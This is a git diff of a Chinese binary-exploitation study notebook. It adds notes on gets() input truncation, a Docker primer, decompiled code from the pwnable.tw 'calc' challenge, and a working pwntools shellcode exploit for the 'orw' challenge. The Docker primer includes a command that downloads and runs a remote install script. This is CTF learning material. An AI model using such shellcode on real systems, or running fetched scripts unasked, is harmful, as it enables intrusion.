@@ -38,35 +38,54 @@ Table of Contents
     * [%s格式化控制符](#s格式化控制符)
     * [参考](#参考-2)
   * [gets特性](#gets特性)
+    * [介绍](#介绍-2)
+    * [截断](#截断)
+  * [Docker入门](#docker入门)
+    * [介绍](#介绍-3)
+    * [安装](#安装)
+      * [Linux](#linux)
+    * [基本知识](#基本知识)
+      * [image镜像](#image镜像)
+      * [container容器](#container容器)
+    * [基本命令](#基本命令-1)
+      * [拉取镜像](#拉取镜像)
+      * [查看镜像](#查看镜像)
+      * [搜寻镜像](#搜寻镜像)
+      * [删除镜像](#删除镜像)
+      * [查看容器](#查看容器)
+      * [启动容器](#启动容器)
+      * [停止容器](#停止容器)
+      * [删除容器](#删除容器)
+    * [参考](#参考-3)
   * [常用汇编指令](#常用汇编指令)
   * [GitHub入门](#github入门)
   * [Python入门](#python入门)
 * [原理篇](#原理篇)
   * [ret2text](#ret2text)
-    * [介绍](#介绍-2)
+    * [介绍](#介绍-4)
     * [ret2text](#ret2text-1)
       * [Exploit](#exploit)
     * [技巧](#技巧)
     * [实战](#实战)
     * [参考文章](#参考文章)
   * [ret2syscall](#ret2syscall)
-    * [介绍](#介绍-3)
+    * [介绍](#介绍-5)
     * [系统调用](#系统调用)
     * [execve](#execve)
     * [ret2syscall](#ret2syscall-1)
       * [Exploit](#exploit-1)
     * [实战](#实战-1)
-    * [参考](#参考-3)
+    * [参考](#参考-4)
   * [ret2shellcode](#ret2shellcode)
-    * [介绍](#介绍-4)
+    * [介绍](#介绍-6)
     * [shellcode](#shellcode)
     * [EIP/RIP控制](#eiprip控制)
     * [ret2shellcode](#ret2shellcode-1)
       * [Exploit](#exploit-2)
     * [实战](#实战-2)
-    * [参考](#参考-4)
+    * [参考](#参考-5)
   * [ret2libc](#ret2libc)
-    * [介绍](#介绍-5)
+    * [介绍](#介绍-7)
     * [调用约定](#调用约定)
     * [延迟绑定](#延迟绑定)
     * [ret2libc level01](#ret2libc-level01)
@@ -76,9 +95,9 @@ Table of Contents
     * [ret2libc level03](#ret2libc-level03)
       * [Exploit](#exploit-5)
     * [实战](#实战-3)
-    * [参考](#参考-5)
+    * [参考](#参考-6)
   * [format string vuln](#format-string-vuln)
-    * [介绍](#介绍-6)
+    * [介绍](#介绍-8)
     * [printf 基础](#printf-基础)
       * [类型](#类型)
       * [标志](#标志)
@@ -88,21 +107,21 @@ Table of Contents
     * [任意写](#任意写)
       * [Exploit](#exploit-6)
     * [实战](#实战-4)
-    * [参考](#参考-6)
+    * [参考](#参考-7)
   * [format string attack stack](#format-string-attack-stack)
   * [format string attack subfunction](#format-string-attack-subfunction)
   * [integer overflow](#integer-overflow)
   * [ropchain](#ropchain)
-    * [介绍](#介绍-7)
+    * [介绍](#介绍-9)
     * [ropchain](#ropchain-1)
       * [ROPgadget](#ropgadget)
         * [Exploit](#exploit-7)
       * [Ropper](#ropper)
         * [Exploit](#exploit-8)
     * [实战](#实战-5)
-    * [参考](#参考-7)
+    * [参考](#参考-8)
   * [orw shellcode injection](#orw-shellcode-injection)
-    * [介绍](#介绍-8)
+    * [介绍](#介绍-10)
     * [沙盒](#沙盒)
       * [prctl沙盒](#prctl沙盒)
       * [seccomp函数库沙盒](#seccomp函数库沙盒)
@@ -112,25 +131,25 @@ Table of Contents
       * [pwntools Exploit](#pwntools-exploit)
     * [拓展 BPF](#拓展-bpf)
     * [实战](#实战-6)
-    * [参考](#参考-8)
+    * [参考](#参考-9)
   * [or shellcode injection](#or-shellcode-injection)
-    * [介绍](#介绍-9)
+    * [介绍](#介绍-11)
     * [cmp与jz](#cmp与jz)
     * [or shellcode](#or-shellcode)
       * [Exploit](#exploit-10)
     * [实战](#实战-7)
-    * [参考](#参考-9)
+    * [参考](#参考-10)
   * [double shellcode injection](#double-shellcode-injection)
   * [mprotect shellcode injection](#mprotect-shellcode-injection)
-    * [介绍](#介绍-10)
+    * [介绍](#介绍-12)
     * [mprotect](#mprotect)
     * [mprotect shellcode](#mprotect-shellcode)
       * [Exploit](#exploit-11)
     * [实战](#实战-8)
-    * [参考](#参考-10)
+    * [参考](#参考-11)
   * [alphanumeric shellcode injection](#alphanumeric-shellcode-injection)
   * [bypass canary](#bypass-canary)
-    * [介绍](#介绍-11)
+    * [介绍](#介绍-13)
     * [canary保护](#canary保护)
     * [printf leak canary](#printf-leak-canary)
     * [puts leak canary](#puts-leak-canary)
@@ -140,17 +159,17 @@ Table of Contents
     * [劫持\_\_stack\_chk\_fail](#劫持__stack_chk_fail)
     * [利用auxv控制](#利用auxv控制)
     * [实战](#实战-9)
-    * [参考](#参考-11)
+    * [参考](#参考-12)
   * [dynelf](#dynelf)
   * [one\_gadget use](#one_gadget-use)
   * [stack migrate](#stack-migrate)
-    * [介绍](#介绍-12)
+    * [介绍](#介绍-14)
     * [leave指令](#leave指令)
     * [栈迁移](#栈迁移)
       * [Exploit](#exploit-12)
     * [栈劫持](#栈劫持)
     * [实战](#实战-10)
-    * [参考](#参考-12)
+    * [参考](#参考-13)
   * [vsyscall trick](#vsyscall-trick)
   * [chunk extend and overlapping](#chunk-extend-and-overlapping)
   * [unlink](#unlink)
@@ -165,45 +184,55 @@ Table of Contents
   * [realloc trick](#realloc-trick)
   * [setcontext trick](#setcontext-trick)
   * [fix the symbol table](#fix-the-symbol-table)
-    * [介绍](#介绍-13)
+    * [介绍](#介绍-15)
     * [符号表](#符号表)
     * [剥离符号表](#剥离符号表)
     * [恢复符号表](#恢复符号表)
-    * [参考](#参考-13)
+    * [参考](#参考-14)
 * [工具篇](#工具篇)
   * [ROPgadget](#ropgadget-1)
-    * [介绍](#介绍-14)
-    * [安装](#安装)
+    * [介绍](#介绍-16)
+    * [安装](#安装-1)
     * [使用](#使用)
   * [Ropper](#ropper-1)
-    * [介绍](#介绍-15)
-    * [安装](#安装-1)
+    * [介绍](#介绍-17)
+    * [安装](#安装-2)
     * [使用](#使用-1)
   * [one\_gadget](#one_gadget)
-    * [介绍](#介绍-16)
-    * [安装](#安装-2)
+    * [介绍](#介绍-18)
+    * [安装](#安装-3)
     * [使用](#使用-2)
   * [seccomp\-tools](#seccomp-tools)
-    * [介绍](#介绍-17)
-    * [安装](#安装-3)
+    * [介绍](#介绍-19)
+    * [安装](#安装-4)
     * [使用](#使用-3)
   * [LibcSearcher](#libcsearcher)
+  * [IDA插件](#ida插件)
+    * [keypatch](#keypatch)
 * [实战篇](#实战篇)
   * [pwnable\.tw](#pwnabletw)
     * [start](#start)
       * [分析](#分析-1)
       * [Exploit](#exploit-13)
     * [orw](#orw)
+      * [分析](#分析-2)
+      * [Exploit](#exploit-14)
+    * [CVE\-2018\-1160](#cve-2018-1160)
+      * [参考](#参考-15)
+    * [calc](#calc)
+      * [分析](#分析-3)
     * [dubblesort](#dubblesort)
   * [2021 蓝帽杯](#2021-蓝帽杯)
     * [slient](#slient)
-      * [分析](#分析-2)
-      * [Exploit](#exploit-14)
+      * [分析](#分析-4)
+      * [Exploit](#exploit-15)
   * [2021 长城杯](#2021-长城杯)
     * [K1ng\_in\_h3Ap\_I](#k1ng_in_h3ap_i)
-      * [分析](#分析-3)
+      * [分析](#分析-5)
 * [研究篇](#研究篇)
   * [format string vuln attack \.got](#format-string-vuln-attack-got)
+* [附录](#附录)
+  * [ascii码表](#ascii码表)
 
 >   谨献给我最爱的羊羊
 >
@@ -670,6 +699,190 @@ aaaa和bbbb都打印出来了, '\x00'不可打印所以没有打印出来, '\n'�
 -   https://blog.csdn.net/qq_54218833/article/details/121308367
 
 ## gets特性
+
+### 介绍
+
+一般gcc是不推荐使用gets函数来接收字符的, 因为它很容易就会造成溢出漏洞, 我们需要了解一下它输入字符的一个特性
+
+### 截断
+
+为什么说gets函数容易造成溢出, 就是因为它是依靠判断截断字符才会停止接收字符, 所以没有遇到的情况下就会一直进行接收, 那么gets函数的截断字符是什么呢?
+
+一般来说截断字符就两种, 一种靠'\x00'来进行截断, 还有一种就是靠'\n', 我们来试一下这两种
+
+```c
+#include<stdio.h>
+#include<unistd.h>
+#include<string.h>
+int main() {
+    char buf[0x100];
+    memset(buf, 's', 0x100);
+    gets(buf);
+    write(1, buf, 0x100);
+    return 0;
+}
+// gcc program.c -o program
+```
+
+![image-20220408114944698](Self-help_Clown.assets/image-20220408114944698.png)
+
+可以看出来gets遇到'\x00'并没有截断, 遇到'\n'截断了, 而且那个'\n'并没有存储到buf中, 要不然在b之后肯定会有回车, 而'aaaa'和'bbbb'中间那个'\x00'只是因为不可打印所以没显示, 但还是存在的, 为什么我可以确定呢?
+
+![image-20220408115433192](Self-help_Clown.assets/image-20220408115433192.png)
+
+两者相差一个字节, 也就是那个'\x00'
+
+
+
+## Docker入门
+
+### 介绍
+
+首先需要知道一个概念: 容器, 容器其实就是一种沙盒, 它将软件环境和外界隔离开, 这样无论把容器转移到哪种机器上, 程序照样可以运行, 而且可以很方便的创建, 管理, 删除, 而Docker就是对容器技术的一种实现
+
+### 安装
+
+#### Linux
+
+linux下docker安装比较简单, 可以用执行自动化脚本来安装
+
+```sh
+# 下载自动化安装脚本
+$ curl -fsSL get.docker.com -o get-docker.sh
+```
+
+然后赋予权限执行就行
+
+```sh
+$ chmod 755 get-docker.sh
+$ ./get-docker.sh
+```
+
+### 基本知识
+
+#### image镜像
+
+image相当于一个模板, 是一个只读文件, 我们可以拉取需要的镜像, 然后创建我们需要的容器实例, 可以理解我们创建虚拟机需要的iso文件
+
+#### container容器
+
+container相当于image的运行实例, 实际上是对image进行赋值, 然后赋予可读可写权限, 可以理解为创建好的虚拟机
+
+一般运行容器的时候, 会自动拉取需要的image
+
+### 基本命令
+
+#### 拉取镜像
+
+```sh
+$ docker pull NAME[:TAG]
+```
+
+NAME是需要的镜像名称, TAG是对应的版本, 如果不加TAG, 则默认下载最新版本
+
+例子: 拉取ubuntu 16.04的镜像
+
+![screenshots](Self-help_Clown.assets/screenshots-16494112189991.gif)
+
+#### 查看镜像
+
+```sh
+$ docker images
+```
+
+该命令可以查看已经下载的image
+
+![screenshots](Self-help_Clown.assets/screenshots-16494114618141.gif)
+
+#### 搜寻镜像
+
+```sh
+$ docker search TERM
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16494123048153.gif)
+
+#### 删除镜像
+
+```sh
+$ docker rmi IMAGE[IMAGE]
+```
+
+IMAGE可以是镜像的标签或者ID
+
+标签也就是NAME[:TAG]组合
+
+![screenshots](Self-help_Clown.assets/screenshots-16494126062175.gif)
+
+ID则需要查看一下image信息
+
+![screenshots](Self-help_Clown.assets/screenshots-16494128806167.gif)
+
+#### 查看容器
+
+```sh
+$ docker ps
+```
+
+该条命令只能查看运行中的容器
+
+![image-20220408182517868](Self-help_Clown.assets/image-20220408182517868.png)
+
+```sh
+$ docker ps -a
+```
+
+该条指令可以查看运行中和停止的容器
+
+![image-20220408182742512](Self-help_Clown.assets/image-20220408182742512.png)
+
+
+
+#### 启动容器
+
+```sh
+$ docker start NAMES/ID
+```
+
+NAMES是容器的别名, 位于最后一个属性
+
+![image-20220408183413744](Self-help_Clown.assets/image-20220408183413744.png)
+
+ID则是第一个属性
+
+![screenshots](Self-help_Clown.assets/screenshots-16494137442159.gif)
+
+#### 停止容器
+
+```sh
+$ docker stop NAMES/ID
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-164941501954911.gif)
+
+#### 删除容器
+
+```sh
+$ docker rm NAMES/ID
+```
+
+该命令只能删除停止的容器
+
+![screenshots](Self-help_Clown.assets/screenshots-164941513354713.gif)
+
+对于运行中的容器需要采用强制删除
+
+```sh
+$ docker rm NAMES/ID -f
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-164941520880715.gif)
+
+### 参考
+
+-   https://dockertips.readthedocs.io/en/latest/index.html
+-   https://zhuanlan.zhihu.com/p/268695696
+-   《Docker技术入门与实战》
 
 
 
@@ -4004,6 +4217,12 @@ A获取系统调用号, 如果等于execve的系统调用号的话就跳转到KI
 
 
 
+## IDA插件
+
+### keypatch
+
+>   GitHub: https://github.com/keystone-engine/keypatch
+
 # 实战篇
 
 ## pwnable.tw
@@ -4094,6 +4313,132 @@ o.interactive()
 ### orw
 
 >   题目地址: https://pwnable.tw/challenge/#2
+
+#### 分析
+
+![image-20220404224610273](Self-help_Clown.assets/image-20220404224610273.png)
+
+程序就是简单的输入shellcode然后执行, 但是加了沙盒
+
+![image-20220404224731910](Self-help_Clown.assets/image-20220404224731910.png)
+
+只开放了open, read, write系统调用, 那就orw一把梭就行
+
+#### Exploit
+
+```python
+from pwn import*
+context(os='linux', arch='i386')
+o = process('./orw')
+
+shellc = shellcraft.open("flag")
+shellc += shellcraft.read('eax', 'esp', 0x50)
+shellc += shellcraft.write(1, 'esp', 0x50)
+o.sendline(asm(shellc))
+o.interactive()
+```
+
+![image-20220404225232984](Self-help_Clown.assets/image-20220404225232984.png)
+
+### CVE-2018-1160
+
+>   题目地址: https://pwnable.tw/challenge/#39
+
+
+
+#### 参考
+
+-   https://gtrboy.github.io/posts/netatalk/
+
+### calc
+
+>   题目地址: https://pwnable.tw/challenge/#3
+
+#### 分析
+
+![image-20220404231437217](Self-help_Clown.assets/image-20220404231437217.png)
+
+主要处理就在parse_expr里, 需要对该函数进行逆向分析
+
+```c
+int __cdecl parse_expr(int a1, _DWORD *a2)
+{
+  int v3; // eax
+  int v4; // [esp+20h] [ebp-88h]
+  int i; // [esp+24h] [ebp-84h]
+  int v6; // [esp+28h] [ebp-80h]
+  int v7; // [esp+2Ch] [ebp-7Ch]
+  char *s1; // [esp+30h] [ebp-78h]
+  int v9; // [esp+34h] [ebp-74h]
+  char s[100]; // [esp+38h] [ebp-70h] BYREF
+  unsigned int v11; // [esp+9Ch] [ebp-Ch]
+
+  v11 = __readgsdword(0x14u);
+  v4 = a1;
+  v6 = 0;
+  bzero(s, 0x64u);	// 初始化
+  for ( i = 0; ; ++i )
+  {
+    if ( *(char *)(i + a1) - (unsigned int)'0' > 9 )
+    {
+      v7 = i + a1 - v4;	// 这条语句就相当于 v7 = i
+      s1 = (char *)malloc(v7 + 1);
+      memcpy(s1, v4, v7);	// 复制i个字节到s1
+      s1[v7] = 0;	// 最后以'\x00'截断
+      if ( !strcmp(s1, "0") )
+      {
+        puts("prevent division by zero");
+        fflush(stdout);
+        return 0;
+      }
+      v9 = atoi(s1);	// 转换为数字
+      if ( v9 > 0 )
+      {
+        v3 = (*a2)++;
+        a2[v3 + 1] = v9;
+      }
+      if ( *(_BYTE *)(i + a1) && (unsigned int)(*(char *)(i + 1 + a1) - 48) > 9 )
+      {
+        puts("expression error!");
+        fflush(stdout);
+        return 0;
+      }
+      v4 = i + 1 + a1;
+      if ( s[v6] )
+      {
+        switch ( *(_BYTE *)(i + a1) )
+        {
+          case '%':
+          case '*':
+          case '/':
+            if ( s[v6] != 43 && s[v6] != 45 )
+              goto LABEL_14;
+            s[++v6] = *(_BYTE *)(i + a1);
+            break;
+          case '+':
+          case '-':
+LABEL_14:
+            eval(a2, s[v6]);
+            s[v6] = *(_BYTE *)(i + a1);
+            break;
+          default:
+            eval(a2, s[v6--]);
+            break;
+        }
+      }
+      else
+      {
+        s[v6] = *(_BYTE *)(i + a1);
+      }
+      if ( !*(_BYTE *)(i + a1) )
+        break;
+    }
+  }
+  while ( v6 >= 0 )
+    eval(a2, s[v6--]);
+  return 1;
+}
+```
 
 
 
@@ -4259,5 +4604,13 @@ o.interactive()
 
 
 
+# 附录
 
+## ascii码表
+
+| 码点 | 值   |
+| ---- | ---- |
+|      |      |
+|      |      |
+|      |      |
 
